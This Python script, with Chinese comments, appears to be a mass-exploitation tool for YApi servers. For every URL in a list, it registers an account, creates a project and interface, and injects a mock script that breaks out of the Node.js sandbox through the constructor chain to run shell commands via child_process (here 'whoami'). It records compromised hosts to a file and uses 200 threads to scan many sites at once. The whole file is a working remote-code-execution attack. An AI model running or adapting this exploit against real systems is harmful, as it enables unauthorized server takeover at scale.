# -*- coding: utf-8 -*-
# @time:2021/7/8 13:58
# Author:AD钙奶


# 1.注册
# 2.添加项目
# 3.添加接口
# 4.开启脚本 输入mock脚本
# 5.打开预览
import json
import requests
import threadpool

session = requests.Session()
from loguru import logger


def get_vuln_url(_url, project_id):
    url = f"{_url}/mock/{project_id}/test999"
    headers = {"Accept": "application/json, text/plain, */*",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.64",
                "Content-Type": "application/json;charset=UTF-8",
               "Accept-Encoding": "gzip, deflate"}
    req = session.get(url, headers=headers)
    if req.status_code == 200 and len(req.text) > 2 and "解析出错" not in req.text:
        info = "[+] " + url + " 用户名：test999@qq.com  密码：qq123456.. 当前系统权限：" + (req.text).strip("\n")
        logger.info(info)
        save_vuln(info)



def add_item(_url):
    headers = {"Accept": "application/json, text/plain, */*",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.64",
                "Content-Type": "application/json;charset=UTF-8",
               "Accept-Encoding": "gzip, deflate"}
    url = _url + "/api/group/get_mygroup"
    req = session.get(url, headers=headers, timeout=10)
    if req.status_code == 200:
        # print(f"url: {_url} 注册成功")
        group_id = json.loads(req.text)['data']['_id']
        additem_url = f"{_url}/api/project/add"
        additem_data = {"color": "cyan", "group_id": f"{group_id}", "icon": "code-o", "name": "test999", "project_type": "private"}
        additem_req = session.post(url=additem_url, headers=headers, json=additem_data, timeout=10)
        if req.status_code == 200 or "已存在的项目" in additem_req.text:
            project_id = json.loads(additem_req.text)['data']['_id']
            addapi_url = f"{_url}/api/interface/add"
            addapi_data = {"catid": "166", "method": "GET", "path": "/test999", "project_id": f"{project_id}", "title": "test999"}
            addapi_req = session.post(url=addapi_url, headers=headers, json=addapi_data, timeout=10)
            if addapi_req.status_code == 200:
                mock_script(_url, project_id, headers)



def mock_script(_url, project_id, headers):
    interface_id_url = _url + "/api/interface/list?page=1&limit=20&project_id=" + str(project_id) + ""
    interface_id_req = session.get(url=interface_id_url, headers=headers)
    interface_id = json.loads(interface_id_req.text)['data']['list'][0]['_id']
    mock_url = f"{_url}/api/plugin/advmock/save"
    data = '''{"project_id":"''' + str(project_id) + '''","interface_id":"''' + str(
        interface_id) + '''","mock_script":"const sandbox = this\\nconst ObjectConstructor = this.constructor\\nconst FunctionConstructor = ObjectConstructor.constructor\\nconst myfun = FunctionConstructor('return process')\\nconst process = myfun()\\nmockJson = process.mainModule.require(\\"child_process\\").execSync(\\"whoami\\").toString()","enable":true}'''

    mock_req = session.post(url=mock_url, headers=headers, data=data)
    if mock_req.status_code == 200:
        # print("xxxx")
        get_vuln_url(_url, project_id)


def login(_url):
    url = _url + "/api/user/login"
    header = {
        'Content-Type': 'application/json;charset=utf-8'
    }
    data = '{"email":"test999@qq.com","password":"qq123456.."}'
    session.post(url=url, headers=header, data=data)



def registered(_url):
    try:
        url = f"{_url}/api/user/reg"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.64",
             "Content-Type": "application/json;charset=UTF-8",
             }
        data = {"email": "test999@qq.com", "password": "qq123456..", "username": "test999"}
        res = requests.post(url, headers=headers, json=data, timeout=10)
        if res.status_code == 200:
            json_data = json.loads(res.text)
            if json_data['errmsg'] == "成功！":
                login(_url)
                add_item(_url)
            elif json_data['errmsg'] == "该email已经注册":
                login(_url)
                add_item(_url)
        elif res.status_code == 404:
            print(f"\033[31m[-] url: {_url} 不存在注册接口 \033[0m")

    except Exception as e:
        # print(e)
        pass


def save_vuln(info):
    with open('vuln_save.txt', 'a', encoding='utf-8') as e:
        e.write(info + '\n')


def get_file_url():
    with open('url.txt', 'r', encoding='utf-8') as f:
        urls = f.readlines()
    url = [url.strip() for url in urls if url and url.strip()]
    return url


def main():
    url = get_file_url()
    pool = threadpool.ThreadPool(200)
    thread = threadpool.makeRequests(registered, url)
    [pool.putRequest(req) for req in thread]
    pool.wait()




if __name__ == '__main__':
    main()
